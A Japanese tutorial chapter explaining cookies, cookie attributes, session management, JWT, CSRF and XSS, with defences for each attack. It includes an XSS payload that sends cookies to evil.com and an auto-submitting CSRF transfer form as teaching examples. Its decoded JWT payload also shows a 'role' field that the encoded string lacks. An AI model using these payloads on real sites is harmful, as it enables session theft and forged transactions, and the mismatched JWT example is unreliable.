# 第6章-02：クッキーとセッション

---

## 1. なぜクッキーが必要か

HTTP はステートレスです。サーバーは各リクエストを独立したものとして処理します。

```
リクエスト1: ログインした
リクエスト2: サーバーはリクエスト1のことを知らない → 再ログインが必要？
```

これではショッピングカートが空になったり、毎回ログインが必要になったりします。
「状態（ログイン状態・カートの中身等）」を維持する仕組みが必要です。

**Cookie（クッキー）** は、ブラウザにデータを保存し、
以降のリクエストで自動的にサーバーに送る仕組みです。

---

## 2. Cookie の仕組み

### サーバーが Cookie をセットする

```http
HTTP/1.1 200 OK
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=86400
Set-Cookie: user_lang=ja; Path=/; Max-Age=2592000
```

`Set-Cookie` ヘッダーで Cookie をブラウザに保存させます。

### ブラウザが Cookie を送る

一度 Set-Cookie でセットされると、以降のリクエストで自動的に送られます。

```http
GET /dashboard HTTP/1.1
Host: example.com
Cookie: session_id=abc123; user_lang=ja
```

---

## 3. Cookie の属性

### Expires / Max-Age（有効期限）

```http
Max-Age=86400          ← 86400秒後（1日後）に失効
Expires=Sat, 01 Jan 2027 00:00:00 GMT  ← 日時で指定
```

どちらも指定しない場合は **セッション Cookie**（ブラウザを閉じると消える）になります。

### Domain（送信先ドメイン）

```http
Domain=example.com        ← example.com と *.example.com に送る
```

指定しない場合は、Cookie をセットしたドメインのみに送られます。

### Path（送信先パス）

```http
Path=/api                  ← /api で始まるパスにのみ送る
Path=/                     ← すべてのパスに送る
```

### HttpOnly（JavaScript からアクセス禁止）

```http
HttpOnly
```

JavaScript から `document.cookie` で Cookie を読めなくします。
**XSS（クロスサイトスクリプティング）攻撃** でのセッション盗用を防ぎます。

```javascript
// HttpOnly の Cookie は読み取れない
console.log(document.cookie);  // → "user_lang=ja" （session_id は含まれない）
```

### Secure（HTTPS のみで送信）

```http
Secure
```

HTTPS の通信でのみ Cookie を送ります。
HTTP では送らないため、盗聴されません。

### SameSite（クロスサイトリクエストの制御）

CSRF（クロスサイトリクエストフォージェリ）攻撃を防ぐための属性です。

| 値 | 動作 |
|----|------|
| `Strict` | クロスサイトリクエストでは一切 Cookie を送らない |
| `Lax` | GET のクロスサイトリクエストは許可。POST 等は拒否（デフォルト）|
| `None` | クロスサイトでも送る（Secure 属性が必須）|

```http
SameSite=Lax     ← 推奨（多くのケースでこれで十分）
SameSite=Strict  ← より厳格（外部サイトのリンクからログイン状態が維持されない）
SameSite=None; Secure  ← クロスオリジン API（CORS）で使う場合
```

## 4. セッション管理の仕組み

### セッションとは

複数のリクエストにまたがる一連のやり取りを **セッション** といいます。
セッションには、ログイン情報やカートの中身などの「状態」が含まれます。

### セッションの実装

最もよく使われる「サーバーサイドセッション」の仕組みです。

```
① ユーザーがログイン
   POST /login  Body: {"email": "...", "password": "..."}

② サーバーが認証を確認し、セッション ID を生成
   session_id = generate_random_id()  → "abc123xyz789"

③ セッション ID をキーにして、データをサーバーに保存
   Session["abc123xyz789"] = {"user_id": 42, "role": "admin"}
   （Redis や DB に保存）

④ Cookie でセッション ID をブラウザに送る
   Set-Cookie: session_id=abc123xyz789; HttpOnly; Secure; SameSite=Lax

⑤ 以降のリクエストでブラウザがセッション ID を送る
   Cookie: session_id=abc123xyz789

⑥ サーバーがセッション ID からユーザー情報を取得
   Session["abc123xyz789"] → {"user_id": 42, "role": "admin"}
   → ユーザー ID が42で管理者であることがわかる
```

## 5. JWT によるステートレスセッション

従来のサーバーサイドセッションは、セッション情報をサーバーに保存するため
（データベースや Redis）複数サーバー間での共有が必要でした。

JWT（JSON Web Token）を使うと、**セッション情報をトークン自体に含める** ことができます。

```
JWT の構造:

ヘッダー:
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9
↓ Base64 デコード
{"alg": "RS256", "typ": "JWT"}

ペイロード:
eyJzdWIiOiI0MiIsIm5hbWUiOiJLYXp1a2kiLCJleHAiOjE3NDU2OTY4MDB9
↓ Base64 デコード
{"sub": "42", "name": "Kazuki", "role": "admin", "exp": 1745696800}

署名:
（サーバーの秘密鍵で署名したハッシュ）
```

### JWT の検証

```
① クライアントが JWT をリクエストに含める
   Authorization: Bearer eyJhbGci...

② サーバーが JWT の署名を検証
   （データベースに問い合わせる必要なし！）

③ 有効期限（exp）を確認

④ ペイロードからユーザー情報を取得
```

### サーバーサイドセッション vs JWT

| 比較 | サーバーサイドセッション | JWT |
|------|----------------------|-----|
| サーバーのストレージ | 必要（Redis / DB）| 不要 |
| トークンの無効化 | 即座に可能（DB から削除）| 難しい（有効期限まで使われる）|
| スケーラビリティ | セッションの共有が必要 | ステートレスで容易 |
| トークンサイズ | 小さい（セッション ID のみ）| 大きい（情報を含む）|

## 6. CSRF（クロスサイトリクエストフォージェリ）

Cookie を使ったセッション管理の代表的な攻撃です。

### 攻撃の仕組み

```
① ユーザーが example.com にログイン
   → Cookie: session_id=abc123

② ユーザーが悪意あるサイト evil.com にアクセス

③ evil.com に次のような罠が仕掛けられている:
   <form action="https://example.com/transfer" method="post">
     <input name="amount" value="100000">
     <input name="to" value="attacker">
   </form>
   <script>document.forms[0].submit();</script>

④ ユーザーの Cookie が自動的に送られ、
   example.com に意図しない送金リクエストが送られる！
```

### 対策

**SameSite Cookie 属性**（推奨）

```http
Set-Cookie: session_id=abc123; SameSite=Lax
```

`Lax` なら evil.com からの POST リクエストには Cookie が送られません。

**CSRF トークン**

```html
<form action="/transfer" method="post">
  <input type="hidden" name="csrf_token" value="randomly-generated-token">
  ...
</form>
```

サーバーが発行した一時的なトークンをフォームに埋め込み、
リクエスト時に照合します。

## 7. XSS（クロスサイトスクリプティング）

ユーザーが入力した内容を、適切にエスケープせずに HTML に出力することで
攻撃者のスクリプトが実行される脆弱性です。

### 攻撃の仕組み

```javascript
// 攻撃者が次のような文字列を投稿
<script>document.location='https://evil.com/?c='+document.cookie</script>

// サーバーがエスケープせずに HTML に出力すると:
<p><script>document.location='https://evil.com/?c='+document.cookie</script></p>
// → スクリプトが実行され、Cookie が盗まれる！
```

### 対策

**出力時のエスケープ**

```javascript
// NG
element.innerHTML = userInput;

// OK
element.textContent = userInput;
// または
element.innerHTML = escapeHtml(userInput);
```

**HttpOnly Cookie**

```http
Set-Cookie: session_id=abc123; HttpOnly
```

HttpOnly を設定すると、JavaScript から Cookie を読めないため、
XSS で Cookie を盗まれません。

**CSP（Content Security Policy）**

```http
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com
```

外部からのスクリプト読み込みを制限します。

---

## まとめ

- Cookie：サーバーがブラウザに保存させるデータ。以降のリクエストで自動送信
- セッション：サーバー側に状態（ログイン情報等）を保存。Cookie でセッション ID を管理
- JWT：セッション情報をトークン自体に含める。サーバー側の保存が不要
- Cookie の重要な属性：
  - `HttpOnly`：XSS 対策（JS からアクセス不可）
  - `Secure`：HTTPS のみで送信
  - `SameSite=Lax`：CSRF 対策
- CSRF：Cookie を悪用した意図しないリクエスト → SameSite・CSRF トークンで対策
- XSS：スクリプト注入 → 出力エスケープ・HttpOnly・CSP で対策
